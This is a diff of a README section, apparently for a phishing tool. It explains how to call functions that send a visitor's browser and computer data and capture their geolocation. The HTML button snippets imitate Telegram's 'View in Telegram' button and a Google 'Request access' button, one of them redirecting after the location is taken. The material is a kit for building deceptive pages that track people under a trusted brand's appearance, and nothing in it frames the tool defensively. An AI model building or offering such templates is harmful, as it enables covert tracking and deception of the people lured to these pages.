@@ -12,9 +12,9 @@ The `information()` function can be called anywhere, to send browser/computer da
 
 For the location, the `location` function must be called (on a button click or another action), it takes two parameters. The first one is the function to call once the location is sent, and the other is the function to call when the user declines location access.
 
-`<a class="tgme_action_button_new" onclick="locate(popup, function(){$('#change').html('Failed');});">View in Telegram</a>`
+```<a class="tgme_action_button_new" onclick="locate(popup, function(){$('#change').html('Failed');});">View in Telegram</a>
 Or for a redirect:
-`<button id="requestButton" style="font-weight:bold" class="jfk-button jfk-button-action" onclick="locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Failed');});">Request access</button>`
+<button id="requestButton" style="font-weight:bold" class="jfk-button jfk-button-action" onclick="locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Failed');});">Request access</button>```
 
 ## Template files
 There is a unique `templates.json` file, add another entry to this file, at the end.
